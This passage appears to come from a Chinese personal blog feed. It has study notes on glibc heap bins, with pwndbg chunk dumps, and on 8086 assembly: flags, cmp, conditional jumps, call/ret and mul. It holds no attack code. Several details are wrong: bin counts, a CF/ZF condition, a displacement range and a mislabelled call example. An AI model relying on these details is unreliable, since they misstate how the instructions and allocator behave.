class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x555555756250</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x555555756270</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x555555756260</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x555555756290</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x555555756280</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x5555557562b0</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x5555557562a0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x20d31</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">4</span>]: <span class="number">0x5555557562c0</span> —▸ <span class="number">0x5555557562a0</span> —▸ <span class="number">0x555555756280</span> —▸ <span class="number">0x555555756260</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>还可以直接查看内存中chunk的情况（64位系统用gx，32位用wx）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x555555756250</span></span><br><span class="line">    (prev_size)          (size)</span><br><span class="line"><span class="number">0x555555756250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span></span><br><span class="line">                             (User data)</span><br><span class="line"><span class="number">0x555555756260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>fastbins主要是用于提高小内存的分配效率，默认情况下：</p><ul><li>对于SIZE_SZ为4Bytes的平台，小于64Bytes的chunk分配请求</li><li>对于SIZE_SZ为8Bytes的平台，小于128Bytes的chunk分配请求</li></ul><p>首先会查找fastbins中是否有所需要大小的chunk存在（精确匹配大小），如果存在，就直接返回</p><p>fastbins可以看作是samll bins的一小部分cache，默认情况下，fastbins只cache了small bins的前7个大小的空闲chunk（虽然有10个chunk的空间），也就是说：</p><ul><li>对于对于SIZE_SZ为4Bytes的平台，fastbins的7个chunk空闲链表（bin），每个bin的chunk大小依次为：16Bytes，24Bytes，32Bytes，40Bytes，56Bytes，64Bytes</li><li>对于对于SIZE_SZ为8Bytes的平台，fastbins的7个chunk空闲链表（bin），每个bin的chunk大小依次为：32Bytes，48Bytes，64Bytes，80Bytes，96Bytes，128Bytes</li></ul><h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h2><p>可以看作是small bins和large bins的cache，只有<strong>1</strong>个unsort bin，以双向链表管理空闲chunk，空闲chunk不排序，所有的chunk在回收时都要先放到unsorted bin中，分配时，如果在unsorted bin中没有合适的chunk，就会把unsorted bin中的所有的chunk分别加入到所属的bin中，然后再在bin中分配合适的chunk。Bins数组中的元素bin[1]用于存储unsorted bin的chunk链表头</p><h2 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h2><p>small bins管理空闲小chunk，每个small bin中的chunk大小与bin的index有如下关系：</p><ul><li>chunk_size = 2*SIZE_SZ * index</li></ul><p>因此在SIZE_SZ为4B的平台上，small_bins中的chunk大小是以8B为公差的等差数列，最大的chunk大小为504B，最小的chunk大小为16B，所在实际上共62个bin</p><p>在SIZE_SZ为8B的平台上，small_bins中的chunk大小是以16B为公差的等差数列，最大的chunk大小为1008B，最小的chunk大小为32B，所在实际上共62个bin</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编笔记04</title>
      <link href="/2020/02/07/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F04/"/>
      <url>/2020/02/07/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F04/</url>
      
        <content type="html"><![CDATA[<h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><p>8086CPU的标志寄存器(flag)有16位，其中存储的信息通常被称为程序状态字(PSW)。flag和其它寄存器不一样，其它寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息</p><p>flag的1、3、5、12、13、14、15位在8086CPU中没有使用，不具有任何含义。而0、2、4、6、7、8、9、10、11位都具有特殊的含义</p><table><thead><tr><th align="center">0</th><th align="center">CF</th></tr></thead><tbody><tr><td align="center"><strong>2</strong></td><td align="center"><strong>PF</strong></td></tr><tr><td align="center"><strong>4</strong></td><td align="center"><strong>AF</strong></td></tr><tr><td align="center"><strong>6</strong></td><td align="center"><strong>ZF</strong></td></tr><tr><td align="center"><strong>7</strong></td><td align="center"><strong>SF</strong></td></tr><tr><td align="center"><strong>8</strong></td><td align="center"><strong>TF</strong></td></tr><tr><td align="center"><strong>9</strong></td><td align="center"><strong>IF</strong></td></tr><tr><td align="center"><strong>10</strong></td><td align="center"><strong>DF</strong></td></tr><tr><td align="center"><strong>11</strong></td><td align="center"><strong>OF</strong></td></tr></tbody></table><p>在8086CPU的指令集中，有的指令的执行是影响标志寄存器的，比如：add、sub、mul、div、inc、or、and等，它们大都是运算指令（进行逻辑或算术运算）</p><p>有的指令的执行对标志寄存器没有影响，比如：mov、push、pop等，它们大都是传送指令</p><p>我们在使用一条指令的时候，要注意这条指令的全部功能，其中包括，执行结果对标志寄存器的哪些标志位造成影响。有时候一条指令会对标志寄存器中的多个标志位产生影响</p><h2 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h2><p>ZF是零标志位，它记录相关指令执行后：</p><ul><li>结果为0，ZF=1</li><li>结果不为0，ZF=0</li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure><p>指令执行后，结果为0，则ZF=1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure><p>指令执行后，结果为1，则ZF=0</p><h2 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h2><p>PF是奇偶标志位，它记录指令执行后，结果的所有二进制位中1的个数：</p><ul><li>为偶数，PF=1</li><li>为奇数，PF=0</li></ul><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">add al,10</span><br></pre></td></tr></table></figure><p>执行后，结果为00001011B，其中有3（奇数）个1，则PF=0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">or al,10</span><br></pre></td></tr></table></figure><p>执行后，结果为00000011B，其中有2（偶数）个1，则PF=1</p><h2 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h2><p>SF是符号标志位，它记录指令执行后：</p><ul><li>结果为负，SF=1</li><li>结果为正，SF=0</li></ul><p>在我们将数据当作有符号数来运算的时候，可以通过它来得知结果的正负。但是，如果我们将数据当作无符号数来运算，SF的值则没有意义，虽然相关的指令影响了它的值</p><p>CPU在执行add等指令时，是必然要影响到SF标志位的值，至于我们需不要这种影响，就取决于我们如何看待指令所进行的运算了</p><h2 id="CF标志"><a href="#CF标志" class="headerlink" title="CF标志"></a>CF标志</h2><p>CF是进位标志位，一般情况下，在进行无符号数运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值</p><p>对于位数为N的无符号数来说，其对应的二进制信息的最高位，即第N-1位是最高有效位。而假想存在的第N位，就是相对于最高有效位的更高位。其实CPU在运算的时候，并不丢弃进位值，而是记录在CF位</p><h2 id="OF标志"><a href="#OF标志" class="headerlink" title="OF标志"></a>OF标志</h2><p>OF是溢出标志位，记录是否产生了溢出，一定要注意CF和OF的区别：</p><ul><li>CF是对无符号数运算有意义的标志位，对于无符号数运算，CPU用CF位来记录是否产生了进位</li><li>OF是对有符号数运算有意义的标志位，对于有符号数运算，CPU用OF位来记录是否产生了溢出</li></ul><h2 id="adc指令"><a href="#adc指令" class="headerlink" title="adc指令"></a>adc指令</h2><p>adc是带进位加法指令，它利用了CF位上记录的进位值</p><p>格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adc 操作对象1，操作对象2</span><br></pre></td></tr></table></figure><p>功能：</p><p>操作对象1 = 操作对象1 + 操作对象2 + CF</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adc ax,bx</span><br></pre></td></tr></table></figure><p>其实现的功能是：(ax)=(ax)+(bx)+CF</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">mov bx,1</span><br><span class="line">sub bx,ax</span><br><span class="line">adc ax,1</span><br></pre></td></tr></table></figure><p>执行后，(ax)=4，相当于计算：（ax）+1+CF=2+1+1=4</p><p>在执行adc指令的时候加上的CF的值的含义，由之前的指令决定的，也就是说关键在于所加上的CF值是被什么指令设置的，如果CF的值是被sub指令设置的，那么它的含义就是借位值；如果是被add指令设置的，那么它的含义就是进位值</p><h2 id="sbb指令"><a href="#sbb指令" class="headerlink" title="sbb指令"></a>sbb指令</h2><p>sbb是带借位减法指令，它利用了CF位上记录的借位值</p><p>格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbb 操作对象1，操作对象2</span><br></pre></td></tr></table></figure><p>功能：</p><p>操作对象1 = 操作对象1 - 操作对象2 - CF</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbb ax,bx</span><br></pre></td></tr></table></figure><p>其实现的功能是：(ax)=(ax)-(bx)-CF</p><h2 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a>cmp指令</h2><p>cmp是比较指令，功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响，其他相关指令通过识别这些被影响的标志寄存器来得知比较结果</p><p>格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp 操作对象1，操作对象2</span><br></pre></td></tr></table></figure><p>功能：</p><p>操作对象1 - 操作对象2 ，但并不保存结果，仅仅根据计算结果对标志寄存器进行设置</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp ax,ax</span><br></pre></td></tr></table></figure><p>做(ax)-(ax)的运算，结果为0，但并不在ax中保存，仅影响flag的相关各位，指令执行后：</p><ul><li>ZF=1</li><li>PF=1</li><li>SF=0</li><li>CF=0</li><li>OF=0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,8</span><br><span class="line">mov bx,3</span><br><span class="line">cmp ax,bx</span><br></pre></td></tr></table></figure><p>指令执行后：</p><ul><li><p>(ax)=8</p></li><li><p>ZF=0</p></li><li><p>PF=1</p></li><li><p>SF=0</p></li><li><p>CF=0</p></li><li><p>OF=0</p></li></ul><p>可以得到以下逻辑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp ax,bx</span><br></pre></td></tr></table></figure><ul><li>如果(ax)=(bx)，则(ax)-(bx)=0，所以：ZF=1</li><li>如果(ax)!=(bx)，则(ax)-(bx)!=0，所以：ZF=0</li><li>如果(ax)&lt;(bx)，则(ax)-(bx)将产生借位，所以：CF=1</li><li>如果(ax)&gt;=(bx)，则(ax)-(bx)不必借位，所以：CF=0</li><li>如果(ax)&gt;(bx)，则(ax)-(bx)不必借位且结果也不为0，所以：CF=0且ZF=0</li><li>如果(ax)&lt;=(bx)，则(ax)-(bx)既可能产生借位且结果又可能为0，所以：CF=1且ZF=1</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp ax,ax</span><br></pre></td></tr></table></figure><ul><li>ZF=1，说明(ax)=(bx)</li><li>ZF=0，说明(ax)!=(bx)</li><li>CF=1，说明(ax)&lt;(bx)</li><li>CF=0，说明(ax)&gt;=(bx)</li><li>CF=0且ZF=0，说明(ax)&gt;(bx)</li><li>CF=1或ZF=1，说明(ax)&lt;=(bx)</li></ul><h2 id="检测比较结果的条件转移指令"><a href="#检测比较结果的条件转移指令" class="headerlink" title="检测比较结果的条件转移指令"></a>检测比较结果的条件转移指令</h2><table><thead><tr><th align="center">指令</th><th align="center">含义</th><th align="center">检测的相关标志位</th></tr></thead><tbody><tr><td align="center">je</td><td align="center">等于则转移</td><td align="center">ZF=1</td></tr><tr><td align="center">jne</td><td align="center">不等于则转移</td><td align="center">ZF=0</td></tr><tr><td align="center">jb</td><td align="center">低于则转移</td><td align="center">CF=1</td></tr><tr><td align="center">jnb</td><td align="center">不低于则转移</td><td align="center">CF=0</td></tr><tr><td align="center">ja</td><td align="center">高于则转移</td><td align="center">CF=0,ZF=0</td></tr><tr><td align="center">jna</td><td align="center">不高于则转移</td><td align="center">CF=1或ZF=1</td></tr></tbody></table><p>这些指令都比较常用，它们所检测的标志位都是cmp指令进行无符号数比较时记录比较结果的标志位：</p><ul><li><p>j：表示jump</p></li><li><p>e：表示equal</p></li><li><p>ne：表示not equal</p></li><li><p>b：表示below</p></li><li><p>nb：表示not below</p></li><li><p>a：表示above</p></li><li><p>na：表示note above</p></li></ul><h2 id="DF标志和串传送指令"><a href="#DF标志和串传送指令" class="headerlink" title="DF标志和串传送指令"></a>DF标志和串传送指令</h2><p>DF是方向标志位，在串处理指令中，控制每次操作后si，di的增减</p><ul><li>DF=0：每次操作后si，di递增</li><li>DF=1：每次操作后si，di递减</li></ul><p>格式1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movsb</span><br></pre></td></tr></table></figure><p>将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器DF位的值，将si和di递增或递减</p><p>功能：（以字节为单位传送）</p><ul><li>((es)<em>16+(di))=((ds)</em>16+(si))</li><li>如果DF=0，则：<ul><li>(si)=(si)+1</li><li>(di)=(di)+1</li></ul></li><li>如果DF=1，则：<ul><li>(si)=(si)-1</li><li>(di)=(di)-1</li></ul></li></ul><p>格式1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movsw</span><br></pre></td></tr></table></figure><p>将ds:si指向的内存单元中的字送入es:di中，然后根据标志寄存器DF位的值，将si和di递增2或递减2</p><p>功能：（以字为单位传送）</p><ul><li>((es)<em>16+(di))=((ds)</em>16+(si))</li><li>如果DF=0，则：<ul><li>(si)=(si)+2</li><li>(di)=(di)+2</li></ul></li><li>如果DF=1，则：<ul><li>(si)=(si)-2</li><li>(di)=(di)-2</li></ul></li></ul><p>movsb和movsw进行的是串传送操作中的一个步骤，一般来说，movsb和movsw都和rep配合使用，格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rep movsb</span><br></pre></td></tr></table></figure><p>rep的作用是根据cx的值，重复执行后面的串送指令。由于每执行一次movsb指令si和di都会递增或递减指向后一个单元或前个单元，则rep movsb就可以循环实现（cx）个字符的传送</p><p>8086CPU提供以下两条指令对DF位进行设置：</p><ul><li>cld指令：将标志寄存器的DF置0</li><li>std指令：将标志寄存器的DF置1</li></ul><h2 id="pushf和popf"><a href="#pushf和popf" class="headerlink" title="pushf和popf"></a>pushf和popf</h2><ul><li>pushf：将标志寄存器的值压栈</li><li>popf：从栈中弹出数据，送入标志寄存器中</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编笔记03</title>
      <link href="/2020/02/06/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F03/"/>
      <url>/2020/02/06/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F03/</url>
      
        <content type="html"><![CDATA[<h2 id="Call和Ret"><a href="#Call和Ret" class="headerlink" title="Call和Ret"></a>Call和Ret</h2><p>call和ret指令都是转移指令，他们都修改IP，或同时修改CS和IP，他们经常被共同用来实现程序的设计</p><h2 id="ret和retf"><a href="#ret和retf" class="headerlink" title="ret和retf"></a>ret和retf</h2><ul><li>ret指令用栈中的数据修改IP的内容，从而实现近转移<ul><li>CPU执行ret指令时，进行下面两步操作<ul><li>(IP)=((ss)*16+(sp))</li><li>(sp)=(sp)+2</li></ul></li><li>CPU执行ret指令时，相当于进行：<ul><li>pop IP</li></ul></li></ul></li><li>retf指令用栈中的数据修改CS和IP的内容，从而实现远转移<ul><li>CPU执行retf指令时，进行下面两步操作<ul><li>(IP)=((ss)*16+(sp))</li><li>(sp)=(sp)+2</li><li>(CS)=((ss)*16+(sp))</li><li>(sp)=(sp)+2</li></ul></li><li>CPU执行ret指令时，相当于进行：<ul><li>pop IP</li><li>pop CS</li></ul></li></ul></li></ul><p>使用ret的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume  cs:codesg</span><br><span class="line">stack segment</span><br><span class="line">    db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line">codesg segment</span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line">start:</span><br><span class="line">    mov ax,stack</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov sp,16</span><br><span class="line">    mov ax,0</span><br><span class="line">    push ax</span><br><span class="line">    mov bx,0</span><br><span class="line">    ret</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>使用retf的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume  cs:codesg</span><br><span class="line">stack segment</span><br><span class="line">    db 16 dup (0)</span><br><span class="line">stack ends</span><br><span class="line">codesg segment</span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line">start:</span><br><span class="line">    mov ax,stack</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov sp,16</span><br><span class="line">    mov ax,0</span><br><span class="line">    push ax</span><br><span class="line">    push cs</span><br><span class="line">    mov bx,0</span><br><span class="line">    retf</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h1 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h1><p>call指令经常跟ret指令配合使用，因此CPU执行call指令，进行两步操作：</p><ul><li>将当前的IP或CS和IP压入栈中</li><li>转移(jump)</li></ul><p>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同</p><h4 id="依据位移经行转移的call指令"><a href="#依据位移经行转移的call指令" class="headerlink" title="依据位移经行转移的call指令"></a>依据位移经行转移的call指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 标号 （将当前的IP压栈后，转到标号处执行指令）</span><br></pre></td></tr></table></figure><p>CPU执行此种格式的call指令时，进行如下的操作：</p><ul><li>(sp)=(sp)-2</li><li>((ss)*16+(sp))=(IP)</li><li>(IP)=(IP)+16位位移</li></ul><p>相当于进行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure><p>一些解释：</p><ul><li>16位移 = “标号”处的地址 - call指令后的第一个字节的地址</li><li>16位位移的范围为-32769~32767，用补码表示</li><li>16位位移由编译程序在编译时算出</li></ul><h4 id="转移的目的地址在指令中的call指令"><a href="#转移的目的地址在指令中的call指令" class="headerlink" title="转移的目的地址在指令中的call指令"></a>转移的目的地址在指令中的call指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call far ptr 标号 （实现的是段间转移）</span><br></pre></td></tr></table></figure><p>CPU执行此种格式的指令时，进行如下的操作：</p><ul><li>(sp)=sp-2</li><li>((ss)*16+(sp))=(CS)</li><li>(sp)=sp-2</li><li>((ss)*16+(sp))=(IP)</li><li>(CS)=标号所在的段地址</li><li>(IP)=标号所在的段地址</li></ul><p>相当于进行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure><h4 id="转移地址在寄存器中的call指令"><a href="#转移地址在寄存器中的call指令" class="headerlink" title="转移地址在寄存器中的call指令"></a>转移地址在寄存器中的call指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 16位寄存器</span><br></pre></td></tr></table></figure><p>CPU执行此种格式的指令时，进行如下的操作：</p><ul><li>(sp)=(sp)-2</li><li>((ss)*16+(sp))=(IP)</li><li>(IP)=(16位寄存器)</li></ul><p>相当于进行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp 16位寄存器</span><br></pre></td></tr></table></figure><h4 id="转移地址在内存中的call指令"><a href="#转移地址在内存中的call指令" class="headerlink" title="转移地址在内存中的call指令"></a>转移地址在内存中的call指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call word ptr 内存单元地址</span><br></pre></td></tr></table></figure><p>相当于进行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push IP</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">call word ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(IP)=0123H，(sp)=0EH</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call dword ptr 内存单元地址</span><br></pre></td></tr></table></figure><p>相当于进行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov sp,10h</span><br><span class="line">mov ax,0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">call word ptr ds:[0]</span><br></pre></td></tr></table></figure><p>执行后，(CS)=0，(IP)=0123H，(sp)=0CH </p><h2 id="mul指令"><a href="#mul指令" class="headerlink" title="mul指令"></a>mul指令</h2><p>mul是乘法指令</p><ul><li>相乘的两个数，要么都是8位，要么都是16位<ul><li>8位：AL中和8位寄存器或内存字节单元中</li><li>16位：AX中和16位寄存器或内存字节单元中</li></ul></li><li>运算结果<ul><li>8位：AX中</li><li>16位：DX（高位）和AX（地位）中</li></ul></li></ul><p>格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mul reg</span><br><span class="line">mul内存单元</span><br></pre></td></tr></table></figure><p>内存单元可以用不同的寻址方式给出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mul byte ptr ds:[0]</span><br></pre></td></tr></table></figure><p>含义为：(ax)=(al)*((ds)*16+0)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mul word ptr [bx+si+8]</span><br></pre></td></tr></table></figure><p>含义为：</p><ul><li>(ax)=(al)*((ds)*16+(bx)+(si)+8)结果的低16位</li><li>(dx)=(al)*((ds)*16+(bx)+(si)+8)结果的高16位</li></ul><h2 id="参数和结果传递的问题"><a href="#参数和结果传递的问题" class="headerlink" title="参数和结果传递的问题"></a>参数和结果传递的问题</h2><p>子程序一般都要根据提供的参数处理一定的事务，处理后，将结果（返回值）提供给调用者</p><p>用寄存器来存储参数和结果是最常使用的方法。对于存放参数的寄存器和存放结果的寄存器，调用者和子程序的读写操作恰恰相反：</p><ul><li>调用者将参数送入参数寄存器，从结果寄存器中取到返回值</li><li>子程序从参数寄存器中取到参数，将返回值送入结果寄存器</li></ul><p>除了寄存器、内存传递参数外，还有一种通用的方法使用栈来传递参数</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编笔记02</title>
      <link href="/2020/02/04/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F02/"/>
      <url>/2020/02/04/8086%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F02/</url>
      
